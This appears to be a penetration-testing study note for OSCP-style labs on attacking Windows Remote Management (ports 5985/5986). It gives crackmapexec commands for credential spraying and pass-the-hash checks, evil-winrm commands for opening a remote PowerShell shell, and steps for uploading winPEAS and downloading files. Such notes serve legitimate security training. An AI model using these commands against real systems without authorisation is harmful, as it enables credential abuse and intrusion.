# WinRM (5985,5986)

## Up
- [[Services]]

Windows Remote Management (5985 HTTP / 5986 HTTPS). With valid creds (or an NTLM hash) for a user in **Remote Management Users**/local admin, **evil-winrm** gives a clean PowerShell shell — a very common Windows/AD foothold.

---

## Enumerate

```bash
nmap -p5985,5986 -sC -sV $IP
crackmapexec winrm $IP -u user -p pass            # (Pwn3d!) = WinRM access
crackmapexec winrm $IP -u users.txt -p passwords.txt --continue-on-success
crackmapexec winrm $IP -u user -H <NTLM>          # pass-the-hash check
```

---

## Foothold (evil-winrm)

```bash
evil-winrm -i $IP -u user -p 'pass'
evil-winrm -i $IP -u user -H <NTLM_hash>          # pass-the-hash (no password!)
evil-winrm -i $IP -u user -p pass -s ./scripts -e ./exes   # upload dirs
```

Inside evil-winrm:
```powershell
upload winPEASx64.exe           # built-in file transfer
download C:\Users\user\Desktop\user.txt
whoami /all                      # → [[Windows PrivEsc]]
```

---

## Common Misconfigurations / Notes

- User in **"Remote Management Users"** group (not just admins) can WinRM → foothold as a normal user.
- **Pass-the-Hash** works over WinRM — you rarely need to crack the NTLM.
- Creds/hashes from [[SMB (139,445)]], [[LDAP (389)]], [[MSSQL (1433)]], or [[Active Directory]] roasting → try them here.

---

## OSCP Tips

- After any Windows creds/hash → **`cme winrm`** to check access, then **evil-winrm**.
- evil-winrm's **`upload`/`download`** make tool transfer trivial (no separate HTTP server needed).
- This is the standard "I have a domain user's creds, now what" shell → then [[Windows PrivEsc]] / [[Active Directory]].
